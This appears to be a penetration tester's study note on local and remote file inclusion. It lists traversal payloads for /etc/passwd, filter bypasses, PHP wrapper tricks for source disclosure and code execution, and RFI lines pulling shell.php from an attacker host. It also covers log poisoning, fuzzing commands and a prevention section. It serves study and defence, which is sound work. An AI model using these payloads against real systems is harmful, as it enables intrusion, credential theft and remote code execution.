# File Inclusion

> Status: 🟨 In progress (sections 1–5 of 11 audited; rest already covered)
> Date started: 2026-10-26
> Date finished: 

## 1. Goal
Abuse a parameter that includes a file (`?page=`, `?lang=`) to read local files (**LFI**), disclose source, or get code execution. Remote inclusion (**RFI**) pulls a file from your server when `allow_url_include` is on.

## Vulnerable functions & read-vs-execute (source notes)
LFI happens anywhere a user-controlled param feeds a file-loading function without sanitisation (`?page=`, `?language=`, or a path segment like `/about/:language`). What you can do depends on whether the function **executes** the file or just **reads** it, and whether it allows **remote URLs**:
| Function | Read | Execute | Remote URL |
|---|---|---|---|
| PHP `include()`/`include_once()` | ✅ | ✅ | ✅ |
| PHP `require()`/`require_once()` | ✅ | ✅ | ❌ |
| PHP `file_get_contents()` | ✅ | ❌ | ✅ |
| PHP `fopen()`/`file()` | ✅ | ❌ | ❌ |
| NodeJS `fs.readFile()`/`sendFile()` | ✅ | ❌ | ❌ |
| NodeJS `res.render()` | ✅ | ✅ | ❌ |
| Java `include` / `import` | ✅ | import only | import only |
| .NET `@Html.Partial()` | ✅ | ❌ | ❌ |
| .NET `@Html.RemotePartial()` | ✅ | ❌ | ✅ |
| .NET `Response.WriteFile()` | ✅ | ❌ | ❌ |
| .NET `include` | ✅ | ✅ | ✅ |
Execute-capable functions → potential RCE; read-only → source/sensitive-file disclosure (still critical — may leak creds/keys/other bugs). Example vuln code: `include($_GET['language']);` (PHP), `res.render(\`/${req.params.language}/about.html\`)` (Express), `<jsp:include file="<%= request.getParameter('language') %>"/>` (Java), `Response.WriteFile(Request.Query['language'])` (.NET).

## Basic LFI & path traversal
```text
http://t/?lang=/etc/passwd                       # direct include
http://t/?lang=../../../../etc/passwd            # escape the intended dir
http://t/?lang=....//....//etc/passwd            # if ../ is filtered non-recursively
```
Windows targets: `..\..\..\windows\win.ini`, `C:\Windows\System32\drivers\etc\hosts`.

**Prefix cases** — input isn't always used alone:
- `include("./languages/" . $_GET['language'])` → directory prepended, traversal works directly (`../../../etc/passwd`).
- `include("lang_" . $_GET['language'])` → **filename prefix**: traversal breaks (`lang_../..`), so lead with `/` to treat the prefix as a dir: `/../../../etc/passwd` (works only if a `lang_/`-style dir exists).
- `include($_GET['language'] . ".php")` → **appended extension**: `/etc/passwd.php` fails — needs a wrapper/null-byte/truncation bypass (below).

Tip: traversal is safe to over-do (extra `../` at root just stays at root), but for clean reports use the **minimum** `../` — count dirs from root (`/var/www/html` = 3 → `../../../`).

## Second-order (stored) LFI
The dangerous input is pulled from the DB, not direct. e.g. an avatar fetch `/profile/$username/avatar.png` — register with username `../../../etc/passwd`, then trigger the avatar download → it includes your poisoned path. Devs validate `?page=` but trust DB values. Spot any function that pulls a file from an indirectly-controlled value.

## Bypasses
- **Non-recursive `../` filter** (`str_replace('../','',...)` runs once): `....//`, `..././`, `..../`, `....////` (the filter strips the inner `../`, leaving a valid one).
- **Encoding:** URL-encode `%2e%2e%2f` (encode the dots too — some encoders skip them); double-encode `%252e%252e%252f`; obsolete on PHP > 5.3.4 core but custom filters still fall for it.
- **Approved-path filter** (regex requires `./languages/`): prepend it then traverse: `./languages/../../../etc/passwd` (combine with encoding/recursive if layered).
- **Appended extension** (code adds `.php`): use a PHP wrapper (below). *Old PHP only:*
  - **Null byte** (PHP < 5.5): `/etc/passwd%00` → `%00.php` truncated.
  - **Path truncation** (PHP < 5.3): strings cap at 4096 chars, trailing `/.` and `//` collapse — pad to drop `.php`. Start with a non-existent dir:
    ```bash
    echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
    ```

## PHP wrappers (LFI → source disclosure / RCE)
```text
# read PHP SOURCE (normally it'd execute) — base64 so it survives transit:
?lang=php://filter/convert.base64-encode/resource=config.php   → base64 -d to read
# data/input wrappers for RCE (if allow_url_include):
?lang=data://text/plain;base64,<base64-of-php>
?lang=php://input   (POST the PHP in the body)
# expect:// for direct command exec (if the extension is loaded)
```

## PHP wrappers for RCE — requirements & detail
Before trying `data://`/`input://`, confirm the config via the base64 filter:
```text
?lang=php://filter/convert.base64-encode/resource=/etc/php/<ver>/apache2/php.ini
# decode, then: grep -i "allow_url_include\|expect"
```
- **`data://`** and **`input://`** need **`allow_url_include = On`**. data:// carries base64-encoded PHP inline (`data://text/plain;base64,<your-b64-php>` — encode your own payload, not stored here); input:// takes the PHP in the POST body with the command as a GET param (`curl -s "http://t/?lang=php://input&cmd=id" --data "<php>"`).
- **`expect://`** needs the **expect extension** loaded → direct command exec: `?lang=expect://id`.
- **`phar://` / `zip://`** — when you can upload a file: pack PHP into a phar/zip, then LFI into it for execution (classic "upload a .jpg, LFI the phar inside").

> Check the config first (which wrappers are even possible), then: `expect://` is the simplest if present; else `data://`/`input://` need `allow_url_include`; else fall back to log poisoning. Each needs a specific setting enabled, so enumerate php.ini via the base64 filter before burning time.

## RFI (Remote File Inclusion)
If the include allows a remote URL (`allow_url_include = On`), host your payload and include it → RCE. RFI implies LFI, not vice versa; also enables SSRF.
```text
?lang=http://<me>/shell.php          # HTTP (python3 -m http.server)
?lang=ftp://<me>/shell.php           # FTP (pyftpdlib) — WAF bypass
?lang=\\<me>\share\shell.php         # SMB UNC (impacket smbserver) — Windows, internal
```
Test first with `?lang=http://127.0.0.1/` to confirm remote fetch works.

## LFI → RCE paths
- **PHP filter source disclosure** → read config/source → find creds or the next bug.
- **Upload + LFI** (when upload exists but doesn't execute): embed PHP in a file the server stores, then LFI it:
  - **Image**: valid magic bytes (`GIF89a;`) + PHP appended, upload as `.gif`, LFI the path.
  - **zip://**: upload a zip containing a PHP shell → `?lang=zip://uploaded.zip%23shell.php` (needs zip ext).
  - **phar://**: pack PHP in a phar → `?lang=phar://uploaded.phar/shell` (needs phar ext).
- **Log poisoning** (need read access to the log):
  - **Server logs**: poison `User-Agent` (or any logged header) with PHP → LFI `access.log` (Apache `/var/log/apache2/access.log`, Nginx) → executes. (Webshell not stored here.)
  - **PHP session**: put PHP in a controllable session var → LFI the session file (`/var/lib/php/sessions/sess_<PHPSESSID>`).
  - Others: `/proc/self/environ`, `/proc/self/fd/N`, mail logs, vsftpd/sshd logs.

> RFI is instant RCE when `allow_url_include` is on (test `http://127.0.0.1` first). When it's off: PHP filter to read source → upload+LFI or log poisoning to execute. Match the technique to which PHP extensions/settings are enabled (check php.ini via the base64 filter).

## Automated discovery & fuzzing
```bash
# hidden params (then test each for LFI) — -fs filters the baseline size
ffuf -w SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://t/index.php?FUZZ=value' -fs <baseline>
# LFI payload wordlist
ffuf -w SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://t/index.php?language=FUZZ' -fs <baseline>
# find webroot / config / log paths to include
ffuf -w SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://t/?language=../../../../FUZZ/index.php' -fs <baseline>
```
Tools (mostly dated, Python2): LFISuite, liffy, LFiFreak — verify results manually. **Automated scanning never replaces manual testing**; complex bypasses/WAF evasion need hand-crafted payloads.

## Fix / prevention
- **Best defense: don't put user input into include paths.** Load assets by a fixed map, not a parameter.
- **Whitelist** allowed values → specific files (DB lookup / case-match / JSON map).
- **Stop traversal:** use `basename()`; recursive `../` stripping (naive single-pass replace is bypassable with `....//`).
- **PHP config:** `allow_url_fopen=Off`, `allow_url_include=Off`, `open_basedir` to sandbox file access, disable `expect`/risky modules.
- **Defense in depth:** WAF (ModSecurity), least privilege, patching, monitoring/IDS, store sensitive files outside the webroot.

> LFI ladder: read `/etc/passwd` to confirm → `php://filter` to pull source/creds → escalate to RCE via log poisoning or a data/input wrapper. The base64 filter is the key trick — it lets you read PHP that would otherwise just execute.
